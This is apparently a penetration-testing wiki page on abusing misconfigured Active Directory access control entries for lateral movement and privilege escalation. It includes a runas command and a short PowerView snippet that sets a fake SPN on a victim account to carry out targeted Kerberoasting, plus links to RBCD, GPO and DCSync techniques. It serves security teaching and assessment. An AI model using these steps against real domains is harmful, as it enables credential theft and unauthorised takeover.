# Access Control Entries \(ACEs\)

## Theory

Access privileges for resources in Active Directory Domain Services are usually granted through the use of an Access Control Entry \(ACE\). Access Control Entries describe the allowed and denied permissions for a principal in Active Directory against a securable object \(user, group, computer, container, organization unit \(OU\), GPO and so on\)

DACLs \(Active Directory Discretionary Access Control Lists\) are lists made of ACEs \(Access Control Entries\).

When misconfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.

## Practice

{% hint style="info" %}
The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to.

The following abuses can only be carried out when running commands as the user the ACE is set on. On Windows systems, this can be achieved with the following command.

```bash
runas /netonly /user:$DOMAIN\$USER
```

All abuses below can be carried out on a Windows system \(the system doesn't even have to be enrolled in the domain\). 

On UNIX-like systems, a few of the following abuses can be carried out. The [aclpwn](https://github.com/fox-it/aclpwn.py) could maybe do the job in most cases. Personally, I always encountered errors and unsupported operations when trying to use it but I will probably do some further tests to include it here.
{% endhint %}

{% hint style="success" %}
Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential`, `-Domain` and `-Server` parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. This can be useful when trying to this from a Windows system that isn't enrolled in the AD domain.

Here is an example with targeted Kerberoasting \(see [`GenericAll`](./#genericall), [`GenericWrite`](./#genericwrite)\).

```bash
$SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
$User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
$User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
```
{% endhint %}

### Exploitation paths

In order to navigate the notes, you can use the following mindmap

![](../../../.gitbook/assets/abusing-aces.png)

All of the aforementioned attacks \(red blocks\) are detailed in the child notes, except:

* **Kerberos RBCD**: see [ADDS &gt; Movement &gt; Kerberos &gt; Kerberos Delegations &gt; RBCD](../abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd)
* **GPO abuses**: see [ADDS &gt; Movement &gt; GPOs](../abusing-gpos.md)
* **DCSync** : see [ADDS &gt; Movement &gt; Credential &gt; Dumping &gt; DCSync](../credentials/dumping/dcsync.md)

## Resources

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\#genericall-on-user" caption="" %}

{% embed url="https://wald0.com/?p=112" caption="" %}

{% embed url="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm" %}

{% embed url="https://adsecurity.org/?p=3658" %}





